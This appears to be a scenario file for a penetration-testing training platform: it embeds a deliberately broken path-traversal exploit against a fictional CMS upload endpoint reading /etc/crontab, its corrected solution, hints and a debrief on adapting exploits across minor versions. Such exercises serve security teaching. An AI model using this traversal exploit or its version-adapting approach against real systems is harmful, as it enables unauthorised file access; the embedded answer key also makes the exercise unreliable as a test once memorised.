"""salvage defect class 3: the proof-of-concept is right, the version is not.

The single most common reason a well-written exploit fails against a live
target: it was written against a different minor release. Endpoints move,
parameters get renamed, verbs change. The fix is never in the exploit logic
and always in the request.
"""

from __future__ import annotations

from ...model import SalvageBody, Scenario
from ...targets._hits import Requirement

BROKEN = r'''#!/usr/bin/env python3
# Wexler CMS - document upload path traversal (CVE-2026-0000, fictional)
# Written against Wexler 2.0.x
import urllib.parse
import urllib.request
import urllib.error

TARGET = "{{URL}}"
TRAVERSAL = "../../../../etc/crontab"

def main():
    data = urllib.parse.urlencode({"file": TRAVERSAL,
                                   "title": "invoice"}).encode()
    req = urllib.request.Request(TARGET + "/api/upload", data)
    try:
        body = urllib.request.urlopen(req).read().decode()
    except urllib.error.HTTPError as e:
        print("[-] HTTP " + str(e.code))
        body = e.read().decode()
    print("[*] response: " + body)
    print("[+] landed" if "CRUX-LANDED" in body else "[-] no")

if __name__ == "__main__":
    main()
'''

SOLUTION = BROKEN.replace('"/api/upload"', '"/api/v2/upload"') \
                 .replace('{"file": TRAVERSAL,', '{"document": TRAVERSAL,')

SCENARIOS = [
    Scenario(
        id='salvage-endpoint', track='salvage', tier='verified', order=30,
        title='404, and the exploit logic is fine',
        waypoint='webatk-lfi', hone=('curl',),
        source='PEN-200 Playbook/04 - Phase 4 - Initial Foothold (Web).md',
        body=SalvageBody(
            brief='The target runs Wexler CMS **2.1**. This proof-of-concept '
                  'was written against 2.0. From the vendor changelog for '
                  '2.1: *"The v1 API has been removed. Upload moves to '
                  '`/api/v2/upload`, and its `file` parameter is now '
                  '`document`."*',
            filename='wexler_upload.py',
            cve='CVE-2021-42013', models='Apache httpd 2.4.49/2.4.50',
            real_note=(
                'CVE-2021-41773 in Apache 2.4.49 used one traversal payload; '
                'the 2.4.50 fix was incomplete and CVE-2021-42013 needed a '
                'double-encoded path. A PoC aimed at the wrong minor version '
                '404s just like this.'
            ),
            defects=('endpoint moved between minor versions',
                     'parameter renamed'),
            route='/api/v2/upload',
            reject_code=422,
            reject_message='unknown field; expected document',
            broken=BROKEN, solution=SOLUTION,
            requirements=(
                Requirement('the v2 endpoint', 'route', '/api/v2/upload',
                            hint='the request went to the v1 path, which 2.1 '
                                 'removed'),
                Requirement('the renamed parameter', 'form', '..', key='document',
                            hint='the traversal arrived in a field the server '
                                 'does not read any more'),
            ),
            debrief='Two changes in one minor release, and the exploit logic '
                    'was never wrong. **When a proof-of-concept 404s, compare '
                    'versions before you debug the payload.** The changelog '
                    'and the release notes are part of the exploit, and the '
                    'server told you as much: once the path was right it '
                    'stopped saying `Not Found` and started saying which '
                    'field it wanted.',
        ),
    ),
]
